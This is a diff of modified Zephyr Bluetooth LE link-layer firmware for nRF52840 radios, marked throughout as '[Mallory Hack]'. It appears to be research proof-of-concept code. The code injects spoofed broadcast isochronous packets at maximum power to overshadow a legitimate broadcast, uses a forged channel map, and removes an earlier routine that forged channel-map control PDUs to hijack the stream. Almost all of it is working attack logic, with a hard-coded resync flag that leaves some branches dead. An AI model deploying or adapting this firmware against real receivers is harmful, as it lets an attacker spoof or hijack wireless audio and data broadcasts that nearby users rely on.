@@ -54,6 +54,7 @@ extern uint32_t cntr_cnt_get(void);
 
 static uint8_t global_ctrl_chan_use = 0;
 static uint32_t evil_counter_val = 666;
+static bool resync_active = false; // Flag to indicate resync event
 // [Mallory Hack] GLOBALS END
 
 static int init_reset(void);
@@ -82,6 +83,7 @@ static void isr_rx_iso_data_invalid(const struct lll_sync_iso *const lll,
 				    uint16_t handle,
 				    struct node_rx_pdu *node_rx);
 static void isr_rx_ctrl_recv(struct lll_sync_iso *lll, struct pdu_bis *pdu);
+static void mallory_attack_reset(void); // [Mallory Hack] Forward declaration
 
 /* FIXME: Optimize by moving to a common place, as similar variable is used for
  * connections too.
@@ -98,8 +100,6 @@ static void isr_spoofed_iso_ctrl_subevent_done(void *param)
 
 	radio_tmr_end_capture();
 	radio_status_reset();
-
-	printk("[MALLORY] Sent CHAN_MAP_IND control PDU (forking)\n");
 }
 
 static void isr_spoofed_iso_done(void *param)
@@ -114,62 +114,16 @@ static void isr_spoofed_iso_done(void *param)
 	struct lll_sync_iso *lll;
 	lll = param;
 
-	uint16_t event_counter;
-	event_counter = (lll->payload_count / lll->bn) + lll->latency_event;
+	// [Mallory Hack] Always signal event completion
+	struct event_done_extra *e;
+	e = ull_done_extra_type_set(EVENT_DONE_EXTRA_TYPE_SYNC_ISO);
+	LL_ASSERT(e);
 
-	printk("[MALLORY] Sent evil payload 666 (event %u, phase %u)\n", event_counter, phase);
+	e->estab_failed = 0U;
+	e->trx_cnt = 0U;
+	e->crc_valid = 0U;
 
-	if ((event_counter - 1) > forking_start && (event_counter - 1) <= forking_instant) {
-		uint8_t access_addr[4];
-		util_bis_aa_le32(0U, lll->seed_access_addr, access_addr);
-
-		uint8_t crc_init[3];
-		crc_init[0] = 0U;
-		(void)memcpy(&crc_init[1], lll->base_crc_init, sizeof(uint16_t));
-
-		radio_phy_set(lll->phy, PHY_FLAGS_S8);
-		radio_aa_set(access_addr);
-		radio_crc_configure(PDU_CRC_POLYNOMIAL, sys_get_le24(crc_init));
-		lll_chan_set(global_ctrl_chan_use);
-
-		struct pdu_bis *pdu = NULL;
-		struct pdu_big_ctrl_chan_map_ind *chm;
-
-		pdu = radio_pkt_big_ctrl_get();
-		pdu->ll_id = PDU_BIS_LLID_CTRL;
-		pdu->cssn = 1U;
-		pdu->cstf = 0U;
-		pdu->rfu = 0U;
-
-		pdu->len = offsetof(struct pdu_big_ctrl, ctrl_data) +
-			   sizeof(struct pdu_big_ctrl_chan_map_ind);
-		pdu->ctrl.opcode = PDU_BIG_CTRL_TYPE_CHAN_MAP_IND;
-
-		chm = (void *)&pdu->ctrl.chan_map_ind;
-		(void)memcpy(chm->chm, &forking_chan_map, sizeof(chm->chm));
-		chm->instant = forking_instant;
-
-		radio_pkt_tx_set(pdu);
-
-		uint8_t pkt_flags;
-		pkt_flags = RADIO_PKT_CONF_FLAGS(RADIO_PKT_CONF_PDU_TYPE_BIS,
-						 lll->phy,
-						 RADIO_PKT_CONF_CTE_DISABLED);
-		radio_pkt_configure(RADIO_PKT_CONF_LENGTH_8BIT,
-					sizeof(struct pdu_big_ctrl),
-					pkt_flags);
-
-		radio_isr_set(isr_spoofed_iso_ctrl_subevent_done, NULL);
-		radio_switch_complete_and_disable();
-		radio_tmr_start(1U, cntr_cnt_get() + 3, 0U);
-	}
-
-	if (event_counter == forking_instant) {
-		lll->data_chan_count =
-				util_ones_count_get(&forking_chan_map[0], sizeof(forking_chan_map));
-		(void)memcpy(lll->data_chan_map, &forking_chan_map,
-					sizeof(lll->data_chan_map));
-	}
+	lll_isr_cleanup(param);
 }
 // [Mallory Hack] ATTACK LOGIC END
 
@@ -201,6 +155,9 @@ void lll_sync_iso_create_prepare(void *param)
 {
 	int err;
 
+	// [Mallory Hack] Reset attack state on new BIG sync creation
+	mallory_attack_reset();
+
 	err = lll_hfclock_on();
 	LL_ASSERT_ERR(err >= 0);
 
@@ -226,8 +183,19 @@ void lll_sync_iso_flush(uint8_t handle, struct lll_sync_iso *lll)
 	ARG_UNUSED(lll);
 }
 
+// [Mallory Hack] Reset attack state
+static void mallory_attack_reset(void)
+{
+	packets_unil_attack_start = 6;
+	forking_start = 1000;
+	forking_instant = 1000;
+	phase = 1;
+}
+
 static int init_reset(void)
 {
+	// [Mallory Hack] Reset attack state on init
+	mallory_attack_reset();
 	return 0;
 }
 
@@ -259,6 +227,9 @@ static int prepare_cb(struct lll_prepare_param *p)
 
 	// [Mallory Hack] Countdown to attack
 	if (packets_unil_attack_start > 0) {
+		radio_isr_set(isr_rx, p->param);
+	} else if (resync_active) {
+		// [Mallory Hack] Set RX ISR during resync events
 		radio_isr_set(isr_rx, p->param);
 	}
 	packets_unil_attack_start--;
@@ -297,6 +268,9 @@ static int prepare_cb_common(struct lll_prepare_param *p)
 
 	/* Calculate the current event counter value */
 	event_counter = (lll->payload_count / lll->bn) + lll->latency_event;
+
+	// [Mallory Hack] We use dynamic map selection instead.
+	// if (event_counter >= forking_instant && forking_instant != 1000) { ... }
 
 	/* Update BIS packet counter to next value */
 	lll->payload_count += (lll->latency_event + 1U) * lll->bn;
@@ -340,9 +314,20 @@ static int prepare_cb_common(struct lll_prepare_param *p)
 	/* Calculate the radio channel to use for ISO event and hence store the
 	 * channel to be used for control subevent.
 	 */
+	// [Mallory Hack] Dynamic channel map selection + resync logic
+	uint8_t *chan_map_to_use = lll->data_chan_map;
+	uint8_t chan_count_to_use = lll->data_chan_count;
+	
+	bool resync = false; 
+
+	if (phase >= 2 && !resync) {
+		chan_map_to_use = &forking_chan_map[0];
+		chan_count_to_use = util_ones_count_get(&forking_chan_map[0], sizeof(forking_chan_map));
+	}
+
 	data_chan_use = lll_chan_iso_event(event_counter, data_chan_id,
-					   lll->data_chan_map,
-					   lll->data_chan_count,
+					   chan_map_to_use,
+					   chan_count_to_use,
 					   &lll->data_chan.prn_s,
 					   &lll->data_chan.remap_idx);
 
@@ -417,8 +402,11 @@ static int prepare_cb_common(struct lll_prepare_param *p)
 	radio_crc_configure(PDU_CRC_POLYNOMIAL, sys_get_le24(crc_init));
 	lll_chan_set(data_chan_use);
 
+	// [Mallory Hack] Set resync flag for prepare_cb to check
+	resync_active = resync;
+
 	// [Mallory Hack] Injection logic start
-	if (packets_unil_attack_start <= 0) {
+	if (packets_unil_attack_start <= 0 && !resync) {
 		uint8_t pkt_flags = RADIO_PKT_CONF_FLAGS(RADIO_PKT_CONF_PDU_TYPE_BIS,
 						 lll->phy,
 						 RADIO_PKT_CONF_CTE_DISABLED);
@@ -426,15 +414,27 @@ static int prepare_cb_common(struct lll_prepare_param *p)
 
 		// Determine phase for forking attack
 		if (event_counter >= forking_start && event_counter < forking_instant) {
+			// [Mallory Hack] Phase 1
 			sniffed_bis_pdu.ll_id = PDU_BIS_LLID_COMPLETE_END;
-			sniffed_bis_pdu.cssn = 1U;
-			sniffed_bis_pdu.cstf = 1U;
-			phase = 2;
-		} else if (event_counter >= forking_instant) {
-			sniffed_bis_pdu.ll_id = PDU_BIS_LLID_COMPLETE_END;
-			sniffed_bis_pdu.cssn = 1U;
+			sniffed_bis_pdu.cssn = 0U;
 			sniffed_bis_pdu.cstf = 0U;
-			phase = 3;
+			phase = 1;
+
+			// sniffed_bis_pdu.ll_id = PDU_BIS_LLID_COMPLETE_END;
+			// sniffed_bis_pdu.cssn = 1U;
+			// sniffed_bis_pdu.cstf = 1U;
+			// phase = 2;
+		} else if (event_counter >= forking_instant) {
+			// [Mallory Hack] Phase 1
+			sniffed_bis_pdu.ll_id = PDU_BIS_LLID_COMPLETE_END;
+			sniffed_bis_pdu.cssn = 0U;
+			sniffed_bis_pdu.cstf = 0U;
+			phase = 1;
+
+			// sniffed_bis_pdu.ll_id = PDU_BIS_LLID_COMPLETE_END;
+			// sniffed_bis_pdu.cssn = 1U;
+			// sniffed_bis_pdu.cstf = 0U;
+			// phase = 3;
 		} else {
 			sniffed_bis_pdu.ll_id = PDU_BIS_LLID_COMPLETE_END;
 			sniffed_bis_pdu.cssn = 0U;
@@ -450,18 +450,10 @@ static int prepare_cb_common(struct lll_prepare_param *p)
 		// Insert 666 (Little Endian)
 		sys_put_le32(evil_counter_val, sniffed_bis_pdu.payload);
 
-		radio_tx_power_set(8); // max power for nRF52840
+		radio_tx_power_set(8); // +8 dBm max power for nRF52840
 
 		radio_pkt_tx_set(&sniffed_bis_pdu);
 		radio_isr_set(isr_spoofed_iso_done, lll);
-
-		if (phase == 1) {
-			printk("[MALLORY] Attack ACTIVE - Phase 1 (overshadowing), event %u\n", event_counter);
-		} else if (phase == 2) {
-			printk("[MALLORY] Phase 2 (forking) - sending CHAN_MAP_IND, event %u\n", event_counter);
-		} else if (phase == 3) {
-			printk("[MALLORY] Phase 3 (hijack complete), event %u\n", event_counter);
-		}
 
 		/* If inside the forking window, allow for back-to-back TX to send Ctrl PDU */
 		if ((event_counter - 1) > forking_start && (event_counter - 1) <= forking_instant) {
